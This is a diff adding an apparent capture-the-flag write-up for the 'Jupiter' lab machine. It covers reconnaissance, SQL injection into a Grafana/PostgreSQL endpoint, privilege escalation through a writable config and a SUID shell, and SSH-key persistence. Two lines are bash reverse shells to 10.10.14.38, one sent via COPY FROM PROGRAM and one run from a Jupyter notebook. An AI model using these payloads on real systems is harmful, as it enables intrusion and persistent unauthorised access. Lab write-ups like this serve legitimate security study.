@@ -1,0 +1,66 @@
+## Initial Reconnaissance
+
+**Nmap Scanning**
+
+Perform a service version scan using `nmap -sV IP`.
+
+**Vhost Enumeration with Gobuster**
+
+Use Gobuster to enumerate virtual hosts: `gobuster vhost -u http://jupiter.htb/ -w /usr/share/wordlists/seclists/subdomains-top1million-5000.txt --append-domain`
+
+## Exploiting PostgreSQL Injection
+
+**POST Request and Payload Reference**
+
+Navigate through the site and analyze each API request with Brup.
+`/api/ds/query` shows there is `Grafana` with `PostGres` as underlying DB.
+Send a POST request to `/api/ds/query` with a specific payload, according to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193): `COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.38/4444 0>&1\"';`
+
+## Privilege Escalation (User)
+
+**Spawn Interactive Shell**
+
+Execute an interactive shell using Python:
+1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+2. Press Ctrl-Z
+3. Run `stty raw -echo; fg` to bring the shell back
+4. Set the terminal: `export TERM=xterm` 
+5. Press Enter
+
+**Finding Files Owned by User "juno"**
+
+Search for files owned by the user "juno": `find / -user juno 2>/dev/null`
+
+**Changing Services Configuration**
+
+There is a particular `/dev/shm/network-simulation.yml` which contains OS commands.
+Modify services in `/dev/shm/network-simulation.yml` by changing the `path` and `args` for processes
+
+**Executing with SUID**
+
+Move to `/tmp` and execute the binary with SUID permissions:
+1. `cd /tmp`
+2. `./bash -p`
+
+**Modifying SSH Authorized Keys**
+
+Modify the `authorized_keys` file in `.ssh` and add your public key.
+
+## Privilege Escalation (root)
+
+**Checking Active Ports**
+
+Check active ports using `netstat -nptl`.
+
+**Local Port Forwarding and Token Retrieval**
+
+Again, find files owned by the currennt user. Among them, there are logs files in `/opt/solar-flares/logs`
+Make an SSH tunnel and map port 8888 locally.
+To log in, retrieve a token from latest file in `/opt/solar-flares/logs`.
+
+**Launching Reverse Shell**
+
+Open a new notebook and run:
+```python
+import os
+os.system('bash -c "bash -i >& /dev/tcp/10.10.14.38/4443 0>&1"')
